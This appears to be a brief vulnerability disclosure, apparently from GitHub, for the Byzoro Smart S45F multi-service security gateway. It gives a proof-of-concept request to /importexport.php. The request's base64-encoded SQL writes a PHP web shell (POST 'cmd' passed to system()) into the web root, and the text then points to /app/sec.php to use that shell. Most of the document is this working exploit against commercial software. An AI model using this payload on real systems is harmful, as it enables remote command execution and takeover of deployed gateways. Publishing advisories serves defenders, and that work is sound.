The Smart S45F multi-service security gateway intelligent management platform has an rce injection vulnerability

official website:https://www.byzoro.com/

version:Smart S45F

Vulnerability location:/importexport.php

![WPS图片(1)](https://github.com/cugerQDHJ/cve/assets/46893950/794035f6-201f-49b5-852e-ebb0e92181a1)

Construct the POC and perform the download

https://ip:port/importexport.php?sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc2VjLnBocCc=&type=exportexcelbysql
![WPS图片(2)](https://github.com/cugerQDHJ/cve/assets/46893950/3fa29410-092a-4cbc-8d6f-13a39c3f280a)

Access /app/sec.php to get the webshell.

![WPS图片(3)](https://github.com/cugerQDHJ/cve/assets/46893950/44c6d2ed-39da-49ea-8944-520f58dd0cce)
